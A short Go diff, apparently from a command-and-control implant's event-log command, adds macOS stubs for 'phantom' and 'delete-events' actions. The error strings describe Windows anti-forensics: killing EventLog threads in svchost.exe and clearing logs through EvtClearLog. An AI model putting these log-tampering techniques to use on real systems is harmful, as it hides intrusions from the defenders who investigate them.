@@ -50,8 +50,12 @@ func (c *EventLogCommand) Execute(task structs.Task) structs.CommandResult {
 		return eventlogDarwinInfo(args.Channel)
 	case "enable", "disable":
 		return eventlogDarwinToggle(args.Action, args.Channel)
+	case "phantom":
+		return errorResult("Error: phantom action is Windows only — kills EventLog service threads in svchost.exe")
+	case "delete-events":
+		return errorResult("Error: delete-events action is Windows only — uses EvtExportLog/EvtClearLog APIs")
 	default:
-		return errorf("Unknown action: %s (use list, query, clear, info, enable, disable)", args.Action)
+		return errorf("Unknown action: %s (use list, query, clear, info, enable, disable, phantom, delete-events)", args.Action)
 	}
 }
 
